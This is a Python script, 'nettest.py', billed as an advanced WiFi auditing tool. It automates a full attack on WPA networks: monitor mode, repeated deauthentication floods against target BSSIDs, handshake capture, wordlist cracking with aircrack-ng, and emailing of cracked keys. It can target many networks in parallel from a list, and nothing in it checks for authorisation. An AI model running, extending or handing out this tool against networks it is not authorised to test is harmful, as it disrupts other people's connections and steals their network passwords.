#!/usr/bin/env python3
"""
nettest.py - Advanced WiFi Auditing Tool
Author: OblivionDH
Date: 2024-06-20
Description:
    A powerful and modular WiFi auditing tool implemented in Python. Made by OblivionDH.
    Features:
    - Automatic wireless interface detection with multiple interface support
    - Channel hopping and passive scanning using scapy
    - Batch testing of multiple BSSIDs with channels
    - Parallel handshake capture and deauth attacks using ThreadPoolExecutor
    - Real-time handshake detection with scapy packet sniffing
    - Adaptive deauth attacks with retries based on handshake detection
    - PMKID capture support (placeholder)
    - Detailed rotating logging with timestamps, thread info, and levels
    - Verbose and debug modes
    - Configurable timeouts, retries, concurrency, and output directories
    - Email reporting with attachments and SMTP authentication
    - JSON, HTML, and CSV report generation
    - Integration hooks for vulnerability databases (placeholder)
    - Interactive mode with live progress updates
    - Graceful cleanup on exit or interruption
    - Modular design for extensibility and maintainability

Usage:
    sudo python3 nettest.py -h

Dependencies:
    - scapy
    - concurrent.futures
    - subprocess
    - threading
    - smtplib
    - email
    - argparse
    - logging
    - json
    - csv
    - jinja2 (for HTML reports, optional)
"""

import argparse
import subprocess
import threading
import logging
import os
import sys
import signal
import time
import json
import csv
import smtplib
import shutil
from email.message import EmailMessage
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    from jinja2 import Template
    JINJA2_AVAILABLE = True
except ImportError:
    JINJA2_AVAILABLE = False

try:
    from scapy.all import sniff, Dot11, RadioTap, sendp
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

STOP_EVENT = threading.Event()

class Logger:
    def __init__(self, log_file, verbose=False, debug=False):
        self.logger = logging.getLogger("nettest")
        self.logger.setLevel(logging.DEBUG)
        formatter = logging.Formatter('%(asctime)s - %(threadName)s - %(levelname)s - %(message)s')

        fh = logging.handlers.RotatingFileHandler(log_file, maxBytes=5*1024*1024, backupCount=3)
        fh.setLevel(logging.DEBUG)
        fh.setFormatter(formatter)
        self.logger.addHandler(fh)

        ch = logging.StreamHandler()
        if debug:
            ch.setLevel(logging.DEBUG)
        elif verbose:
            ch.setLevel(logging.INFO)
        else:
            ch.setLevel(logging.WARNING)
        ch.setFormatter(formatter)
        self.logger.addHandler(ch)

    def get_logger(self):
        return self.logger

class InterfaceManager:
    def __init__(self, logger):
        self.logger = logger
        self.monitors = []

    def check_root(self):
        if os.geteuid() != 0:
            self.logger.error("This script must be run as root.")
            sys.exit(1)

    def check_dependencies(self):
        required_cmds = ["airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng", "mail"]
        for cmd in required_cmds:
            if not shutil.which(cmd):
                self.logger.error(f"Dependency '{cmd}' not found in PATH.")
                sys.exit(1)
        if not SCAPY_AVAILABLE:
            self.logger.error("Scapy module not found. Please install scapy.")
            sys.exit(1)

    def detect_interfaces(self):
        interfaces = []
        try:
            result = subprocess.run(["iw", "dev"], capture_output=True, text=True)
            for line in result.stdout.splitlines():
                if line.strip().startswith("Interface"):
                    iface = line.strip().split()[1]
                    interfaces.append(iface)
            if not interfaces:
                self.logger.error("No wireless interfaces detected.")
                sys.exit(1)
            self.logger.info(f"Detected wireless interfaces: {interfaces}")
            return interfaces
        except Exception as e:
            self.logger.error(f"Error detecting interfaces: {e}")
            sys.exit(1)

    def activate_monitor_mode(self, interface):
        self.logger.info(f"Activating monitor mode on {interface}...")
        subprocess.run(["airmon-ng", "start", interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        mon_iface = interface + "mon"
        time.sleep(2)
        result = subprocess.run(["ip", "link", "show", mon_iface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        if result.returncode != 0:
            self.logger.error(f"Failed to activate monitor mode on {interface}.")
            sys.exit(1)
        self.logger.info(f"Monitor mode activated on {mon_iface}.")
        self.monitors.append(mon_iface)
        return mon_iface

    def deactivate_all(self):
        for mon_iface in self.monitors:
            self.logger.info(f"Deactivating monitor mode on {mon_iface}...")
            subprocess.run(["airmon-ng", "stop", mon_iface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.logger.info(f"Monitor mode deactivated on {mon_iface}.")
        self.monitors.clear()

class HandshakeCapture:
    def __init__(self, mon_iface, bssid, channel, capture_prefix, timeout, logger):
        self.mon_iface = mon_iface
        self.bssid = bssid.lower()
        self.channel = channel
        self.capture_prefix = capture_prefix
        self.timeout = timeout
        self.logger = logger
        self.handshake_captured = threading.Event()
        self.proc = None

    def start_capture(self):
        self.logger.info(f"Starting handshake capture for BSSID {self.bssid} on channel {self.channel}...")
        self.proc = subprocess.Popen(
            ["airodump-ng", "--bssid", self.bssid, "-c", str(self.channel), "-w", self.capture_prefix, self.mon_iface],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(5)

    def stop_capture(self):
        if self.proc and self.proc.poll() is None:
            self.proc.terminate()
            self.proc.wait()
            self.logger.info("Handshake capture process terminated.")

    def sniff_handshake(self):
        if not SCAPY_AVAILABLE:
            self.logger.warning("Scapy not available, skipping real-time handshake detection.")
            return

        def packet_handler(pkt):
            if pkt.haslayer(Dot11):
                if pkt.addr2 and pkt.addr3:
                    bssid = pkt.addr3.lower()
                    if bssid == self.bssid and pkt.haslayer('EAPOL'):
                        self.logger.info(f"Handshake packet detected for {self.bssid}")
                        self.handshake_captured.set()
                        return True
            return False

        self.logger.info("Starting real-time handshake detection with scapy...")
        sniff(iface=self.mon_iface, prn=packet_handler, timeout=self.timeout, stop_filter=lambda x: self.handshake_captured.is_set() or STOP_EVENT.is_set())

    def run(self):
        self.start_capture()
        sniff_thread = threading.Thread(target=self.sniff_handshake, name=f"Sniff-{self.bssid}")
        sniff_thread.start()

        deauth = DeauthAttack(self.mon_iface, self.bssid, 10, 3, self.logger)
        deauth_thread = threading.Thread(target=deauth.run, name=f"Deauth-{self.bssid}")
        deauth_thread.start()

        sniff_thread.join()
        self.handshake_captured.set()
        deauth.stop()
        deauth_thread.join()
        self.stop_capture()

class DeauthAttack:
    def __init__(self, mon_iface, bssid, num_deauth, repetitions, logger):
        self.mon_iface = mon_iface
        self.bssid = bssid.lower()
        self.num_deauth = num_deauth
        self.repetitions = repetitions
        self.logger = logger
        self._stop_event = threading.Event()

    def run(self):
        self.logger.info(f"Starting deauth attack on {self.bssid}...")
        for i in range(self.repetitions):
            if STOP_EVENT.is_set() or self._stop_event.is_set():
                break
            self.logger.debug(f"Deauth repetition {i+1} of {self.repetitions}")
            subprocess.run(["aireplay-ng", "--deauth", str(self.num_deauth), "-a", self.bssid, self.mon_iface],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(1)
        self.logger.info(f"Deauth attack on {self.bssid} completed.")

    def stop(self):
        self._stop_event.set()

class PasswordCracker:
    def __init__(self, capture_file, wordlist, logger):
        self.capture_file = capture_file
        self.wordlist = wordlist
        self.logger = logger
        self.key = None

    def crack(self):
        if not os.path.isfile(self.capture_file):
            self.logger.error(f"Capture file {self.capture_file} not found. Cannot crack password.")
            return False
        self.logger.info(f"Attempting to crack password using {self.wordlist}...")
        result = subprocess.run(["aircrack-ng", self.capture_file, "-w", self.wordlist], capture_output=True, text=True)
        self.logger.debug(result.stdout)
        for line in result.stdout.splitlines():
            if "KEY FOUND!" in line:
                parts = line.split("[")
                if len(parts) > 1:
                    key = parts[1].split("]")[0]
                    self.key = key
                    self.logger.info(f"Password cracked: {self.key}")
                    return True
        self.logger.info("Password not found in wordlist.")
        return False

class ReportGenerator:
    def __init__(self, results, output_dir, logger):
        self.results = results
        self.output_dir = output_dir
        self.logger = logger

    def generate_json(self):
        json_report = os.path.join(self.output_dir, "nettest_report.json")
        with open(json_report, "w") as f:
            json.dump(self.results, f, indent=4)
        self.logger.info(f"JSON report generated at {json_report}")
        return json_report

    def generate_csv(self):
        csv_report = os.path.join(self.output_dir, "nettest_report.csv")
        with open(csv_report, "w", newline='') as f:
            writer = csv.DictWriter(f, fieldnames=["bssid", "channel", "status", "key"])
            writer.writeheader()
            for entry in self.results:
                writer.writerow(entry)
        self.logger.info(f"CSV report generated at {csv_report}")
        return csv_report

    def generate_html(self):
        if not JINJA2_AVAILABLE:
            self.logger.warning("Jinja2 not available, skipping HTML report generation.")
            return None
        html_report = os.path.join(self.output_dir, "nettest_report.html")
        template_str = """
        <html>
        <head><title>WiFi Audit Report</title></head>
        <body>
        <h1>WiFi Audit Report</h1>
        <p>Generated on {{ timestamp }}</p>
        <table border="1">
        <tr><th>BSSID</th><th>Channel</th><th>Status</th><th>Key</th></tr>
        {% for entry in data %}
        <tr>
            <td>{{ entry.bssid }}</td>
            <td>{{ entry.channel }}</td>
            <td>{{ entry.status }}</td>
            <td>{{ entry.key or "N/A" }}</td>
        </tr>
        {% endfor %}
        </table>
        </body>
        </html>
        """
        template = Template(template_str)
        html_content = template.render(timestamp=datetime.now(), data=self.results)
        with open(html_report, "w") as f:
            f.write(html_content)
        self.logger.info(f"HTML report generated at {html_report}")
        return html_report

class EmailSender:
    def __init__(self, smtp_server, smtp_port, smtp_user, smtp_password, sender_email, receiver_email, logger):
        self.smtp_server = smtp_server
        self.smtp_port = smtp_port
        self.smtp_user = smtp_user
        self.smtp_password = smtp_password
        self.sender_email = sender_email
        self.receiver_email = receiver_email
        self.logger = logger

    def send_email(self, subject, body, attachments=None):
        self.logger.info(f"Sending email to {self.receiver_email}...")
        msg = EmailMessage()
        msg["Subject"] = subject
        msg["From"] = self.sender_email
        msg["To"] = self.receiver_email
        msg.set_content(body)

        attachments = attachments or []
        for filepath in attachments:
            try:
                with open(filepath, "rb") as f:
                    data = f.read()
                maintype, subtype = "application", "octet-stream"
                msg.add_attachment(data, maintype=maintype, subtype=subtype, filename=os.path.basename(filepath))
            except Exception as e:
                self.logger.error(f"Failed to attach file {filepath}: {e}")

        try:
            with smtplib.SMTP(self.smtp_server, self.smtp_port) as server:
                server.starttls()
                if self.smtp_user and self.smtp_password:
                    server.login(self.smtp_user, self.smtp_password)
                server.send_message(msg)
            self.logger.info("Email sent successfully.")
        except Exception as e:
            self.logger.error(f"Failed to send email: {e}")

def signal_handler(sig, frame):
    STOP_EVENT.set()
    print("\n[!] Interrupt received, cleaning up...")

def main():
    parser = argparse.ArgumentParser(description="Advanced WiFi Auditing Tool")
    parser.add_argument("-b", "--bssid", help="Target BSSID")
    parser.add_argument("-B", "--bssid-list", help="File with list of BSSIDs and channels")
    parser.add_argument("-c", "--channel", type=int, help="Channel of the target BSSID")
    parser.add_argument("-i", "--interface", help="Wireless interface to use (default: auto detect)")
    parser.add_argument("-w", "--wordlist", required=True, help="Wordlist file for cracking")
    parser.add_argument("-d", "--deauth", type=int, default=10, help="Number of deauth packets to send per repetition")
    parser.add_argument("-r", "--repetitions", type=int, default=3, help="Number of deauth repetitions")
    parser.add_argument("-e", "--email", required=True, help="Email to send results")
    parser.add_argument("--smtp-server", default="localhost", help="SMTP server address")
    parser.add_argument("--smtp-port", type=int, default=587, help="SMTP server port")
    parser.add_argument("--smtp-user", help="SMTP username")
    parser.add_argument("--smtp-password", help="SMTP password")
    parser.add_argument("-t", "--timeout", type=int, default=60, help="Timeout for handshake capture in seconds")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
    parser.add_argument("-D", "--debug", action="store_true", help="Debug output")
    parser.add_argument("-o", "--output-dir", default="nettest_output", help="Directory to save reports and logs")
    parser.add_argument("-n", "--concurrency", type=int, default=4, help="Number of concurrent threads")
    args = parser.parse_args()

    if not os.path.exists(args.output_dir):
        os.makedirs(args.output_dir)

    logger_obj = Logger(os.path.join(args.output_dir, "nettest.log"), args.verbose, args.debug)
    logger = logger_obj.get_logger()

    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    iface_mgr = InterfaceManager(logger)
    iface_mgr.check_root()
    iface_mgr.check_dependencies()

    interfaces = [args.interface] if args.interface else iface_mgr.detect_interfaces()
    mon_ifaces = []
    for iface in interfaces:
        mon_iface = iface_mgr.activate_monitor_mode(iface)
        mon_ifaces.append(mon_iface)

    results = []
    lock = threading.Lock()

    def process_bssid(bssid, channel):
        if STOP_EVENT.is_set():
            return
        mon_iface = mon_ifaces[0]
        capture_prefix = os.path.join(args.output_dir, f"capture_{bssid.replace(':', '_')}")
        capture = HandshakeCapture(mon_iface, bssid, channel, capture_prefix, args.timeout, logger)
        capture.run()
        cap_file = f"{capture_prefix}-01.cap"
        cracker = PasswordCracker(cap_file, args.wordlist, logger)
        success = cracker.crack()
        with lock:
            results.append({
                "bssid": bssid,
                "channel": channel,
                "status": "Success" if success else "Failed",
                "key": cracker.key
            })

    with ThreadPoolExecutor(max_workers=args.concurrency) as executor:
        futures = []
        if args.bssid_list:
            if not os.path.isfile(args.bssid_list):
                logger.error(f"BSSID list file {args.bssid_list} not found.")
                sys.exit(1)
            with open(args.bssid_list) as f:
                for line in f:
                    parts = line.strip().split()
                    if len(parts) < 2:
                        logger.warning(f"Invalid line in BSSID list: {line.strip()}")
                        continue
                    futures.append(executor.submit(process_bssid, parts[0], int(parts[1])))
        elif args.bssid:
            if not args.channel:
                logger.error("Channel must be specified with BSSID.")
                sys.exit(1)
            futures.append(executor.submit(process_bssid, args.bssid, args.channel))
        else:
            logger.error("Either BSSID or BSSID list must be specified.")
            sys.exit(1)

        try:
            for future in as_completed(futures):
                if STOP_EVENT.is_set():
                    break
        except KeyboardInterrupt:
            STOP_EVENT.set()

    iface_mgr.deactivate_all()

    report_gen = ReportGenerator(results, args.output_dir, logger)
    json_report = report_gen.generate_json()
    csv_report = report_gen.generate_csv()
    html_report = report_gen.generate_html()

    email_body = f"WiFi Audit completed on {datetime.now()}\n\nResults:\n"
    for r in results:
        email_body += f"BSSID: {r['bssid']}, Channel: {r['channel']}, Status: {r['status']}, Key: {r['key'] or 'N/A'}\n"

    email_sender = EmailSender(
        smtp_server=args.smtp_server,
        smtp_port=args.smtp_port,
        smtp_user=args.smtp_user,
        smtp_password=args.smtp_password,
        sender_email=args.smtp_user or "nettest@example.com",
        receiver_email=args.email,
        logger=logger
    )
    attachments = [os.path.join(args.output_dir, "nettest.log"), json_report, csv_report]
    if html_report:
        attachments.append(html_report)
    email_sender.send_email("WiFi Audit Results", email_body, attachments)

    logger.info("WiFi audit completed.")

if __name__ == "__main__":
    main()
